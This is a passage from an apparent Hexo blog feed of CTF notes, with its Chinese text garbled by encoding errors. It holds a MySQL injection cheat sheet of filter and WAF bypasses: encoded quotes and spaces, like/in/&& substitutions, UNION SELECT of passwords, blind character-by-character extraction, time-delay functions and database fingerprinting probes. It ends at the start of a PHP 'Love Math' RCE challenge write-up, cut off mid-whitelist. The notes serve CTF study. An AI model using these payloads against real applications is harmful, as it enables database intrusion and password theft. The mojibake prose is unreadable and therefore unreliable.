class="operator">+</span><span class="type">CHAR</span>(<span class="number">97</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">115</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">116</span>)ã€‚</span><br><span class="line"></span><br><span class="line">åå…­è¿›åˆ¶ç¼–ç </span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span>(extractvalue(<span class="number">0x3C613E61646D696E3C2F613E</span>,<span class="number">0x2f61</span>))</span><br><span class="line"></span><br><span class="line">åŒé‡ç¼–ç ç»•è¿‡</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span><span class="keyword">UNION</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a <span class="operator">/</span><span class="keyword">SELECT</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span><span class="number">1</span>,<span class="number">2</span>,password<span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span><span class="keyword">FROM</span><span class="operator">%</span><span class="number">252</span>f<span class="operator">%</span><span class="number">252</span>a<span class="operator">*</span><span class="operator">/</span>Users<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">ä¸€äº›unicodeç¼–ç ä¸¾ä¾‹ï¼š    </span><br><span class="line">å•å¼•å·ï¼š<span class="string">&#x27;</span></span><br><span class="line"><span class="string">%u0027 %u02b9 %u02bc</span></span><br><span class="line"><span class="string">%u02c8 %u2032</span></span><br><span class="line"><span class="string">%uff07 %c0%27</span></span><br><span class="line"><span class="string">%c0%a7 %e0%80%a7</span></span><br><span class="line"><span class="string">ç©ºç™½ï¼š</span></span><br><span class="line"><span class="string">%u0020 %uff00</span></span><br><span class="line"><span class="string">%c0%20 %c0%a0 %e0%80%a0</span></span><br><span class="line"><span class="string">å·¦æ‹¬å·(:</span></span><br><span class="line"><span class="string">%u0028 %uff08</span></span><br><span class="line"><span class="string">%c0%28 %c0%a8</span></span><br><span class="line"><span class="string">%e0%80%a8</span></span><br><span class="line"><span class="string">å³æ‹¬å·):</span></span><br><span class="line"><span class="string">%u0029 %uff09</span></span><br><span class="line"><span class="string">%c0%29 %c0%a9</span></span><br><span class="line"><span class="string">%e0%80%a9</span></span><br></pre></td></tr></table></figure></div></li><li><p>likeç»•è¿‡</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;?id=1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">like</span> <span class="number">1</span>#</span><br><span class="line">å¯ç»•è¿‡å¯¹<span class="operator">=</span> <span class="operator">&gt;</span>ç­‰è¿‡æ»¤</span><br></pre></td></tr></table></figure></div></li><li><p>inç»•è¿‡</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">in</span> (<span class="string">&#x27;1234&#x27;</span>)#</span><br></pre></td></tr></table></figure></div><blockquote><p>inå¯ä»¥ä»£æ›¿â€™&#x3D;â€™ï¼Œåªæœ‰ä¸¤ä¸ªå­—ç¬¦ä¸²ä¸€æ¨¡ä¸€æ ·æ—¶æ‰è¿”å›trueï¼Œæ³¨æ„æ‹¬å·ä¸èƒ½æ¼ï¼Œå¦åˆ™æŠ¥é”™</p></blockquote></li><li><p>è¿‡æ»¤union</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">waf<span class="operator">=</span> <span class="string">&#x27;and|or|union&#x27;</span></span><br><span class="line">ç»•è¿‡æ–¹å¼ <span class="number">1</span><span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">where</span> userid)<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure></div></li><li><p>è¿‡æ»¤where</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where&#x27;</span></span><br><span class="line">ç»•è¿‡æ–¹å¼ <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users limit <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure></div></li><li><p>è¿‡æ»¤limit</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where|limit&#x27;</span></span><br><span class="line">ç»•è¿‡æ–¹å¼ <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> user_id <span class="keyword">having</span> user_id <span class="operator">=</span> <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span>#user_idèšåˆä¸­user_idä¸º<span class="number">1</span>çš„<span class="keyword">user</span>ä¸ºadmim</span><br></pre></td></tr></table></figure></div></li><li><p>è¿‡æ»¤group by</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where|limit|group by&#x27;</span></span><br><span class="line">ç»•è¿‡æ–¹å¼ <span class="number">1</span> <span class="operator">&amp;&amp;</span> (<span class="keyword">select</span> substr(group_concat(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> users ) <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></div></li><li><p>è¿‡æ»¤select</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where|limit|group by|select&#x27;</span></span><br><span class="line">åªèƒ½æŸ¥è¯¢æœ¬è¡¨ä¸­çš„æ•°æ®</span><br><span class="line">ç»•è¿‡æ–¹å¼ <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>mysqlé™¤å¯ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡handlerè¯­å¥å¹¶ä¸å…·å¤‡selectè¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­ã€‚</p></blockquote></li><li><p>è¿‡æ»¤â€™(å•å¼•å·)</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where|limit|group by|select|\&#x27;&#x27;</span></span><br><span class="line"><span class="string">è¿‡æ»¤ä»£ç  1 &amp;&amp; substr(user,1,1) = &#x27;</span>a<span class="string">&#x27;</span></span><br><span class="line"><span class="string">ç»•è¿‡æ–¹å¼ 1 &amp;&amp; user_id is not null    1 &amp;&amp; substr(user,1,1) = 0x61    1 &amp;&amp; substr(user,1,1) = unhex(61)</span></span><br></pre></td></tr></table></figure></div></li><li><p>è¿‡æ»¤hex</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where|limit|group by|select|\&#x27;</span><span class="operator">|</span>hex<span class="string">&#x27;</span></span><br><span class="line"><span class="string">è¿‡æ»¤ä»£ç  1 &amp;&amp; substr(user,1,1) = unhex(61)</span></span><br><span class="line"><span class="string">ç»•è¿‡æ–¹å¼ 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #åè¿›åˆ¶çš„11è½¬åŒ–ä¸ºåå…­è¿›åˆ¶ï¼Œå¹¶å°å†™ã€‚</span></span><br></pre></td></tr></table></figure></div></li><li><p>è¿‡æ»¤substr</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">waf <span class="operator">=</span> <span class="string">&#x27;and|or|union|where|limit|group by|select|\&#x27;</span><span class="operator">|</span>hex<span class="operator">|</span>substr<span class="string">&#x27;</span></span><br><span class="line"><span class="string">è¿‡æ»¤ä»£ç  1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) </span></span><br><span class="line"><span class="string">ç»•è¿‡æ–¹å¼ 1 &amp;&amp; lpad(user(),1,1) in &#x27;</span>r<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div></li><li><p>è¿‡æ»¤é€—å·</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>è¿‡æ»¤äº†é€—å·æ€ä¹ˆåŠï¼Ÿå°±ä¸èƒ½å¤šä¸ªå‚æ•°äº†å—ï¼Ÿ</span><br><span class="line"><span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;2018-08-17&#x27;</span>,<span class="number">6</span>,<span class="number">5</span>);ä¸<span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;2018-08-17&#x27;</span> <span class="keyword">FROM</span> <span class="number">6</span> <span class="keyword">FOR</span> <span class="number">5</span>);</span><br><span class="line">æ„æ€ç›¸åŒ</span><br><span class="line">substræ”¯æŒè¿™æ ·çš„è¯­æ³•ï¼š</span><br><span class="line"><span class="built_in">SUBSTRING</span>(str <span class="keyword">FROM</span> pos <span class="keyword">FOR</span> len)</span><br><span class="line"><span class="built_in">SUBSTRING</span>(str <span class="keyword">FROM</span> pos)</span><br><span class="line">MID()åç»­åŠ å…¥äº†è¿™ç§å†™æ³•</span><br></pre></td></tr></table></figure></div></li></ul><h3 id="ç­‰ä»·å‡½æ•°æˆ–å˜é‡"><a href="#ç­‰ä»·å‡½æ•°æˆ–å˜é‡" class="headerlink" title="ç­‰ä»·å‡½æ•°æˆ–å˜é‡"></a>ç­‰ä»·å‡½æ•°æˆ–å˜é‡</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hex()ã€bin() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> ascii()</span><br><span class="line">sleep() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>benchmark()</span><br><span class="line">concat_ws()<span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>group_concat()</span><br><span class="line">mid()ã€substr() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="built_in">substring</span>()</span><br><span class="line">@<span class="variable">@user</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">user</span>()</span><br><span class="line">@<span class="variable">@datadir</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> datadir()</span><br><span class="line"> </span><br><span class="line">ä¸¾ä¾‹ï¼š<span class="built_in">substring</span>()å’Œsubstr()æ— æ³•ä½¿ç”¨æ—¶ï¼š?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(<span class="built_in">lower</span>(mid((<span class="keyword">select</span> pwd <span class="keyword">from</span> users limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">74</span>ã€€</span><br><span class="line"> </span><br><span class="line">æˆ–è€…ï¼š</span><br><span class="line">substr((<span class="keyword">select</span> <span class="string">&#x27;password&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="number">0x70</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x69</span>) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x70</span>) <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x71</span>) <span class="operator">=</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure></div><h4 id="åå¼•å·ç»•è¿‡"><a href="#åå¼•å·ç»•è¿‡" class="headerlink" title="åå¼•å·ç»•è¿‡"></a>åå¼•å·ç»•è¿‡</h4><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `version()`  å¯ä»¥ç”¨æ¥è¿‡ç©ºæ ¼å’Œæ­£åˆ™ï¼Œç‰¹æ®Šæƒ…å†µä¸‹è¿˜å¯ä»¥å½“ä½œæ³¨é‡Šç¬¦ç”¨</span><br></pre></td></tr></table></figure></div><h1 id="åˆ¤æ–­æ•°æ®åº“ç±»å‹"><a href="#åˆ¤æ–­æ•°æ®åº“ç±»å‹" class="headerlink" title="åˆ¤æ–­æ•°æ®åº“ç±»å‹"></a>åˆ¤æ–­æ•°æ®åº“ç±»å‹</h1><h3 id="å‰ç«¯ä¸æ•°æ®åº“ç±»å‹"><a href="#å‰ç«¯ä¸æ•°æ®åº“ç±»å‹" class="headerlink" title="å‰ç«¯ä¸æ•°æ®åº“ç±»å‹"></a>å‰ç«¯ä¸æ•°æ®åº“ç±»å‹</h3><p>aspï¼šSQL Serverï¼ŒAccess<br>.netï¼šSQL Server<br>phpï¼šMySQLï¼Œ<a class="link"   href="https://so.csdn.net/so/search?q=PostgreSQL&spm=1001.2101.3001.7020" >PostgreSQL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>javaï¼šOracleï¼ŒMySQL</p><h2 id="æ ¹æ®ç‰¹æœ‰å‡½æ•°åˆ¤æ–­"><a href="#æ ¹æ®ç‰¹æœ‰å‡½æ•°åˆ¤æ–­" class="headerlink" title="æ ¹æ®ç‰¹æœ‰å‡½æ•°åˆ¤æ–­"></a>æ ¹æ®ç‰¹æœ‰å‡½æ•°åˆ¤æ–­</h2><h3 id="lenå’Œlength"><a href="#lenå’Œlength" class="headerlink" title="lenå’Œlength"></a>lenå’Œlength</h3><p><code>len()</code>ï¼šSQL Server ã€MySQLä»¥åŠdb2è¿”å›é•¿åº¦çš„å‡½æ•°ã€‚<br><code>length()</code>ï¼šOracleå’ŒINFORMIXè¿”å›é•¿åº¦çš„å‡½æ•°ã€‚</p><h3 id="versionå’Œ-version"><a href="#versionå’Œ-version" class="headerlink" title="versionå’Œ@@version"></a>versionå’Œ@@version</h3><p><code>version()</code>ï¼šMySQLæŸ¥è¯¢ç‰ˆæœ¬ä¿¡æ¯çš„å‡½æ•°<br><code>@@version</code>ï¼šMySQLå’ŒSQL ServeræŸ¥è¯¢ç‰ˆæœ¬ä¿¡æ¯çš„å‡½æ•°</p><h3 id="substringå’Œsubstr"><a href="#substringå’Œsubstr" class="headerlink" title="substringå’Œsubstr"></a>substringå’Œsubstr</h3><p>MySQLä¸¤ä¸ªå‡½æ•°éƒ½å¯ä»¥ä½¿ç”¨<br>Oracleåªå¯è°ƒç”¨substr<br>SQL Serveråªå¯è°ƒç”¨substring</p><h3 id="æ ¹æ®ç‰¹æ®Šç¬¦å·è¿›è¡Œåˆ¤æ–­"><a href="#æ ¹æ®ç‰¹æ®Šç¬¦å·è¿›è¡Œåˆ¤æ–­" class="headerlink" title="æ ¹æ®ç‰¹æ®Šç¬¦å·è¿›è¡Œåˆ¤æ–­"></a>æ ¹æ®ç‰¹æ®Šç¬¦å·è¿›è¡Œåˆ¤æ–­</h3><p>&#x2F;*æ˜¯MySQLæ•°æ®åº“çš„æ³¨é‡Šç¬¦<br>â€“æ˜¯Oracleå’ŒSQL Serveræ”¯æŒçš„æ³¨é‡Šç¬¦<br>;æ˜¯å­å¥æŸ¥è¯¢æ ‡è¯†ç¬¦ï¼ŒOracleä¸æ”¯æŒå¤šè¡ŒæŸ¥è¯¢ï¼Œè‹¥è¿”å›é”™è¯¯ï¼Œåˆ™è¯´æ˜å¯èƒ½æ˜¯Oracleæ•°æ®åº“<br>#æ˜¯MySQLä¸­çš„æ³¨é‡Šç¬¦ï¼Œè¿”å›é”™è¯¯åˆ™è¯´æ˜å¯èƒ½ä¸æ˜¯MySQLï¼Œå¦å¤–MySQLä¹Ÿæ”¯æŒâ€“ å’Œ&#x2F;**&#x2F;</p><h3 id="æ ¹æ®æ•°æ®åº“å¯¹å­—ç¬¦ä¸²çš„å¤„ç†æ–¹å¼åˆ¤æ–­"><a href="#æ ¹æ®æ•°æ®åº“å¯¹å­—ç¬¦ä¸²çš„å¤„ç†æ–¹å¼åˆ¤æ–­" class="headerlink" title="æ ¹æ®æ•°æ®åº“å¯¹å­—ç¬¦ä¸²çš„å¤„ç†æ–¹å¼åˆ¤æ–­"></a>æ ¹æ®æ•°æ®åº“å¯¹å­—ç¬¦ä¸²çš„å¤„ç†æ–¹å¼åˆ¤æ–­</h3><p>MySQL<br><a class="link"   href="http://127.0.0.1/test.php?id=1" >http://127.0.0.1/test.php?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and â€˜aâ€™+â€™bâ€™&#x3D;â€™abâ€™<br><a class="link"   href="http://127.0.0.1/test.php?id=1" >http://127.0.0.1/test.php?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and CONCAT(â€˜aâ€™,â€™bâ€™)&#x3D;â€™abâ€™<br>Oracle<br><a class="link"   href="http://127.0.0.1/test.php?id=1" >http://127.0.0.1/test.php?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and â€˜aâ€™||â€™bâ€™&#x3D;â€™abâ€™<br><a class="link"   href="http://127.0.0.1/test.php?id=1" >http://127.0.0.1/test.php?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and CONCAT(â€˜aâ€™,â€™bâ€™)&#x3D;â€™abâ€™<br>SQL Server<br><a class="link"   href="http://127.0.0.1/test.php?id=1" >http://127.0.0.1/test.php?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and â€˜aâ€™+â€™bâ€™&#x3D;â€™abâ€™ </p><h3 id="æ ¹æ®æ•°æ®åº“ç‰¹æœ‰çš„æ•°æ®è¡¨æ¥åˆ¤æ–­"><a href="#æ ¹æ®æ•°æ®åº“ç‰¹æœ‰çš„æ•°æ®è¡¨æ¥åˆ¤æ–­" class="headerlink" title="æ ¹æ®æ•°æ®åº“ç‰¹æœ‰çš„æ•°æ®è¡¨æ¥åˆ¤æ–­"></a>æ ¹æ®æ•°æ®åº“ç‰¹æœ‰çš„æ•°æ®è¡¨æ¥åˆ¤æ–­</h3><p>MySQLï¼ˆversion&gt;5.0ï¼‰</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and (select count(*) from information_schema.TABLES)&gt;0 and 1=1</span><br></pre></td></tr></table></figure></div><p>Oracle</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and (select count(*) from sys.user_tables)&gt;0 and 1=1</span><br></pre></td></tr></table></figure></div><p>SQL Server</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?id=1 and (select count(*) from sysobjects)&gt;0 and 1=1</span><br></pre></td></tr></table></figure></div><h3 id="æ ¹æ®ç›²æ³¨ç‰¹åˆ«å‡½æ•°åˆ¤æ–­"><a href="#æ ¹æ®ç›²æ³¨ç‰¹åˆ«å‡½æ•°åˆ¤æ–­" class="headerlink" title="æ ¹æ®ç›²æ³¨ç‰¹åˆ«å‡½æ•°åˆ¤æ–­"></a>æ ¹æ®ç›²æ³¨ç‰¹åˆ«å‡½æ•°åˆ¤æ–­</h3><p>MySQL</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BENCHMARK(1000000,ENCODE(&#x27;QWE&#x27;,&#x27;ASD&#x27;))</span><br><span class="line">SLEEP(5)</span><br></pre></td></tr></table></figure></div><p>PostgreSQL</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PG_SLEEP(5)</span><br><span class="line">GENERATE_SERIES(1,1000000)</span><br></pre></td></tr></table></figure></div><p>SQL Server</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WAITFOR DELAY &#x27;0:0:5&#x27;</span><br></pre></td></tr></table></figure></div><p>âš ï¸å¾…è¡¥å…… <a class="link"   href="https://www.freebuf.com/articles/web/261524.html" >ç‚æŠ€ç³»åˆ—ä¹‹ä¸€ç¯‡å°±å¤Ÿäº†â€”â€”mysqlæ³¨å…¥ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>[å¯¹MYSQLæ³¨å…¥ç›¸å…³å†…å®¹åŠéƒ¨åˆ†Trickçš„å½’ç±»å°ç»“ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)](</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> mysql </tag>
            
            <tag> php </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpåˆ©ç”¨mathå‡½æ•°rceç›¸å…³æ€è€ƒä¸ç†è§£</title>
      <link href="/2022/01/20/php%E5%88%A9%E7%94%A8math%E5%87%BD%E6%95%B0rce%E7%9B%B8%E5%85%B3%E6%80%9D%E8%80%83%E4%B8%8E%E7%90%86%E8%A7%A3/"/>
      <url>/2022/01/20/php%E5%88%A9%E7%94%A8math%E5%87%BD%E6%95%B0rce%E7%9B%B8%E5%85%B3%E6%80%9D%E8%80%83%E4%B8%8E%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="phpåˆ©ç”¨mathå‡½æ•°rceç›¸å…³æ€è€ƒä¸ç†è§£"><a href="#phpåˆ©ç”¨mathå‡½æ•°rceç›¸å…³æ€è€ƒä¸ç†è§£" class="headerlink" title="phpåˆ©ç”¨mathå‡½æ•°rceç›¸å…³æ€è€ƒä¸ç†è§£"></a>phpåˆ©ç”¨mathå‡½æ•°rceç›¸å…³æ€è€ƒä¸ç†è§£</h1><h2 id="0x00é¢˜ç›®èƒŒæ™¯"><a href="#0x00é¢˜ç›®èƒŒæ™¯" class="headerlink" title="0x00é¢˜ç›®èƒŒæ™¯"></a>0x00é¢˜ç›®èƒŒæ™¯</h2><p>æ¥è‡ª2019å›½èµ›love mathï¼Œä»¥åŠ[NESTCTF 2019]Love Math 2ï¼Œä¸¤é¢˜çš„åŒºåˆ«åœ¨äºå¯¹payloadçš„é•¿åº¦é™åˆ¶ä¸åŒ</p><h3 id="ç›¸å…³è¿‡æ»¤"><a href="#ç›¸å…³è¿‡æ»¤" class="headerlink" title="ç›¸å…³è¿‡æ»¤"></a>ç›¸å…³è¿‡æ»¤</h3><p>é•¿åº¦é™åˆ¶</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">60</span>) &#123;<span class="comment">//å›½èµ›é™åˆ¶80</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>é»‘åå•ç‰¹æ®Šå­—ç¬¦</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br></pre></td></tr></table></figure></div><p>ç™½åå•å‡½æ•°ï¼ˆéƒ½ä¸ºmathå‡½æ•°ï¼‰</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span 